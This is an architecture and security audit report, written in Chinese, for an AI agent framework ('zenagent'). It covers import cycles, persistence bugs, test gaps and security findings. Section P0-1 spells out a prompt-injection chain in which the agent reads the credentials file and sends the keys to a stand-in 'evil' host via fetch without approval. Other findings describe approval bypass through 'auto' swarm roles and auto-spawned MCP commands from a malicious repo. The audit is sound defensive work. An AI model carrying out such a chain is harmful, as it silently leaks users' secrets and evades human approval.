# 全面架构审计 — 2026-11-14

- 基线：`048a8e3`（0.13.6，orchestration-parity 合并后）
- 规模：`zenagent/` 241 文件 / 51,810 行；`tests/` 222 文件 / 52,279 行 / 2,724 个测试
- 方法：arch-gov 治理面（deps 重抽取 → gov_diff → gov_health）+ 5 路独立维度审计（运行时正确性 / 安全面 / 结构耦合 / 状态持久化 / 测试质量）+ 人工复核全部 P0 与关键 P1 的原始行
- 治理动作：manifest v7（登记 `app.runs`、`app.supervisor` 两节点 + 22 边 + 2 环）、熵增基线重登记 129 项、`gov_health.py`「解除」条目 KeyError 修复

---

## 一、架构现状综述

分层纪律总体成立：agent 内核（`agent/`）、providers、tools、mcp 全程零反向 import；plugins「只上不下」不变量成立；app 层不依赖 cli；四个前端 + 两个编排器统一走 `bootstrap.prepare()` 单一装配线。

orchestration-parity 合并后出现了一个**新的第四层**：运行基建面。`runs.py`（运行台账）、`session_lease.py`（flock 单写者）、`approval_router.py`（审批路由）、`dispatch.py`（mode 无关派工入口）、`agent_profile.py`（角色身份）、`workspace_state.py`（workspace mode 后端事实）——已登记为 `app.runs` + `app.supervisor` 两个治理节点，位置正确（全部位于编排器之下，编排器未绕行）。

**但这一波改动是熵增主力**：`config.py` 646→795、`limits.py` 665→795、`swarm/manager.py` 752→839、`RpcHost` 533→619，全在 11-11 基线之后。app 大环从 11 成员涨到 15（`agent_profile`、`bootstrap`、`zen.fleet`、`zen.tools` 入环），swarm 新增 `approvals↔frames↔manager` 环，`ZenFleet`（472 行/22 方法）与 `SwarmOps`（303 行）越过上帝类阈值。

账本上「唯一剩下的分叉」（权限继承）经审计**升级**：不只是行为不一致——zen 侧 `fleet.py:374` 显式降级 auto→ask（注释写明理由），swarm 侧 `manager.py:630` 原样 `mode=role.mode`，**swarm 角色配 `auto` 即绕过人工审批**，且无任何测试覆盖此路径。

## 二、P0（3 项，均人工复核过原始行）

### P0-1 [安全] read_file 任意读 + fetch 免审批外传 → API 密钥可被静默窃取
- `zenagent/tools/fs.py:511` read_file `approval="read"`；`zenagent/app/permissions.py:400-401` read 级直接放行（`tool_is_read_only → return True, ""`）；`zenagent/tools/web/tools.py:221` fetch 同为 `approval="read"`。文件工具自认 "v1 has no sandbox"（`fs.py:7-9`），围栏只护写不护读。
- 链条：prompt 注入 → 模型零确认 `read_file("~/.zenagent/settings.json")`（存全部 provider key，`settings.py:56`）→ `fetch("https://evil/?k=…")`，默认 ask 模式下也不弹审批。
- 方向：凭据路径对**读**生效（复用 `_PROTECTED_HOME_DIRS`）；fetch 提审批级或对目标域做一次性确认。

### P0-2 [结构] app/__init__.py 急切 re-export，是 15 节点大环的锚点
- `zenagent/app/__init__.py:7-13` 顶层 re-export `ChatController/CommandRegistry/ModelManager/PermissionBroker/Runtime/SessionManager/views`，6 个子模块 `from zenagent.app import X` 包重入（`compact.py:18`、`retry.py:14`、`session_meta.py:19`、`shake.py:15`、`sessions.py:29`、`runtime.py:24`、`commands.py:11`）。
- 导入顺序靠 Python 部分初始化兜底；`__init__` 新增顶层语句随时可能引爆。
- 方向：PEP 562 惰性 `__getattr__`，一处改动切断 7 条重入边，SCC 预期坍缩。

### P0-3 [结构] runtime → zen.tools → zen.fleet → bootstrap → runtime：唯一跨层真运行时环
- `runtime.py:711` 延迟导入 `from zenagent.app.zen.tools import fleet_tools`（212 行注释自认会 cycle）；`zen/tools.py:17` 顶层 `from zenagent.app.zen.fleet import worker_statuses`；`fleet.py:23` 顶层导入 `bootstrap.prepare`；`bootstrap.py:29` 导入 runtime。
- 内核装配对象反向依赖 zen 编排器的工具集；延迟导入只遮住 import 期爆炸。
- 方向：依赖倒置——fleet 工具经 `RuntimeOptions`/extension registry 注入，runtime 不点名 zen 包。

## 三、P1（10 项）

| # | 维度 | 发现 | 锚点 |
|---|---|---|---|
| 1 | 安全 | 项目层 `.zenagent/mcp.json` 自动 spawn 任意命令，无确认；恶意仓库写入即下次启动执行 | `mcp/config.py:127`、`plugin_wiring.py:82` |
| 2 | 编排+安全 | swarm `mode=role.mode` 原样继承，auto 绕过审批；zen 侧显式降级；且 `mode:"auto"` 无测试 | `manager.py:630` vs `fleet.py:374`；`roles.py:253` |
| 3 | 运行时 | `Runtime.bootstrap` 中途失败（扩展/插件加载抛错）泄漏 session lease 与 job/LSP 引用计数，worker session 进程内永久 busy | `runtime.py:409→456` 无 try/except；`bootstrap.py:82` 不捕获 |
| 4 | 运行时 | `ZenFleet.close()` 只 abort 不 `await handle.task`，退出时 worker 的 runtime.close/MCP 子进程不回收 | `fleet.py:572-582`（`wait_all` 无生产调用方） |
| 5 | 持久化 | session JSONL 与 runs.jsonl 无 fsync、无残尾修复；撕裂后下一次 append 拼在残尾上，连带新记录一起丢。room 已修（fsync+`_repair_tail`）但未下沉共享 | `session.py:434-439`、`runs.py:245-255` vs `room.py:269-292` |
| 6 | 持久化 | `work_items.jsonl` 有 fsync 但 load 缺 `_repair_tail`，崩溃后第一条工作项更新被销毁 | `workitems.py:128-136`、`room.py:128-131` |
| 7 | 持久化 | swarm 房间/任务/工作项无跨进程单写者；第二个 manager `start()` 盲目 reconcile，把别进程 running/queued 任务全标 failed | `ops_swarm.py:190-225`、`room.py:173-192`、`manager.py:161-171` |
| 8 | 运行时 | 会话消息写盘失败仅打 stderr，回合照常"成功"——内存/磁盘分叉无 UI 提示；resume 后对话分叉 | `agent.py:262-266` 兜底吞掉、`session.py:492-493` |
| 9 | 结构 | `Runtime` 888 行 5 职责混装（装配/会话生命周期/技能重组/限额/插件刷新），fan-in 42；gov_health 同步报 `ChatController` 642/44、`SwarmManager` 736/36、`RpcHost` 619/24 | `runtime.py:149-1037`；健康报告 |
| 10 | 测试 | 全仓无 mypy/pyright 门禁（ruff 仅默认最小规则集），却声明 `Typing :: Typed`；51.8k 行标注代码无类型门禁 | `pyproject.toml [tool.ruff]` |

## 四、P2（按主题分组）

**持久化纪律（与 room 修复不对称）**
- swarm 角色 `manifest.json`/`prompt.md` 原地 `write_text`，崩溃即角色损坏，下次编辑静默丢字段（`swarm/roster.py:54-58`；承诺"skills/plugins/MCP 必须存活"就在旁边）
- `.zen.json`/`workspace.json` replace 前不 fsync（同族 `.titles/.pins` 有）；断电可剩空文件 → zen 历史清零/mode 回落
- ledger sweep 每进程仅一次（`_SWEPT`），常驻 host 数周后僵尸 running 行不重扫；finish 写失败该行永久 running（`run_wiring.py:44-47`、`runs.py:245-255`）
- `RECORD_VERSION` 写而不读；undo/retry 重写时未知记录类型被静默丢弃（`records.py:210-226`）
- 备份 journal/blobs 无 fsync，断电后 restore 静默跳过缺 blob（`journal.py:229-254`）
- flock 不可用 FS 上 lease 降级不报错 + `session_is_live` 恒 False → sweep 误杀活跑（`session_lease.py:111-141,187-202`）

**编排运行时**
- swarm 取消排队任务与 runner 状态机竞态：非法转移 ValueError + 假 "Task failed" 消息（`manager.py:400-404`、`room.py:33-36` TRANSITIONS 无 cancelled 出边）
- `SwarmManager.close()`/`delete_role` 的 close 循环无异常隔离，一处失败连锁泄漏（`manager.py:226-228,518-523`）
- `switch_session` 先查空闲→abort 当前 run→才真正加锁的 TOCTOU（`runtime.py:1009-1025`）
- `_safe_deliver` 静默吞 worker 报告投递失败，router 会话与 worker 实况分叉（`fleet.py:532-534`）
- fleet dispatch 乐观置 "working" 与信号量不同步，roster 状态失真（`fleet.py:301-303`）

**结构**
- `modals.py` 1042 行 14 个不相关屏幕同居；`repl()` 595 行单函数；`ops_config.py` 969 行 9 组 mixin（切分线已由审计给出）
- TYPE_CHECKING-only 边夸大环（sessions/models/chat 的 Runtime 导入可零成本移入 TYPE_CHECKING）
- hub 政策脱节：fan-in≥15 实际 25 个（types 143、events 84、runtime 42…），`exempt.hub` 为空 → 门禁要么全红要么被无视

**安全纵深**
- 审批卡片参数截断 4000 字符，用户批准"看不见尾巴"的命令（`server.py:238`）
- 模型 markdown 外链未拦截，主窗口可被导航到钓鱼页（`AssistantNodeView.tsx:47-58`）
- 插件 = 无签名任意 Python 执行，信任边界只有"用户装了它"（`extensions.py:102-107`、`plugins/install.py:34-68`）

**测试/工程**
- CI job 无 `timeout-minutes`、无 pytest-timeout、无覆盖率度量
- 墙钟 sleep 时序测试 2 处（`test_tui_sidebar.py:359,387`，等真实 1s 定时器）
- LOC allowlist 零余量条目（repl 1027/1027、modals 1042/1042、ops_config 969/969）+ 大量失真旧条目
- Windows lease 分支 `pragma: no cover` 且 CI 无 Windows 腿；矩阵缺 3.12/3.13
- `cli/permissions.py` 孤儿兼容 shim 仅剩测试引用；ApprovalRouter 单测用手造 id 前缀，未编码生产不变量

## 五、健康面（审计确认做得好的）

- 测试密度 1:1（2,724 个测试 vs 51.8k 行源码），抽检 8 条关键路径 100% 有行为级断言（bootstrap 四模式、loop 三种终止、fleet 降级/继承含 thinking="off" 陷阱、swarm 审批真实落盘断言、ledger 崩溃对账、RPC 帧契约双向钉死）
- 跨进程租约用**真子进程**验证（`test_session_lease.py:101-144`），不是 mock
- 测试卫生：0 无条件 skip、0 xfail、115 处 sleep 仅 2 处真墙钟、`filterwarnings=error`
- RPC 契约测试同时比对 Python 发射端与 `desktop/src/rpc/types.ts`，协议漂移在 CI 变红
- 分层纪律：agent/tools/providers/mcp/plugins 零反向 import；单一装配线无第二路径
- settings.json 0600+原子写、meta.json/relocate 回滚、压缩非破坏性、golden 确定性

## 六、建议修复顺序

1. **本周**：P0-1 密钥外传链（小改动：读路径拒绝凭据目录 + fetch 提级）；P1-2 swarm auto 降级对齐（一个共享 helper）+ 补对照测试
2. **下周**：P0-2 app/__init__ 惰性化；P1-3/4 bootstrap 失败回滚 + fleet close 收尾；P1-5/6 把 room 的 fsync+`_repair_tail` 下沉为共享 AppendLog 工具，session/runs/work_items 统一
3. **排期**：P0-3 fleet 工具依赖倒置；P1-7 swarm 跨进程锁；P1-8 persist 失败走 notice 通道；P1-10 mypy 基线（warn-only 起步）
4. **随手**：P2 里「一行修复」类——work_items 补 `_repair_tail`、roster 原子写、`_safe_deliver` 加 warning、CI timeout、allowlist 重基线
5. **治理**：hub 政策重基线（区分契约枢纽/意外枢纽）；`Runtime` 拆分按结构审计给出的四条切分线另立任务
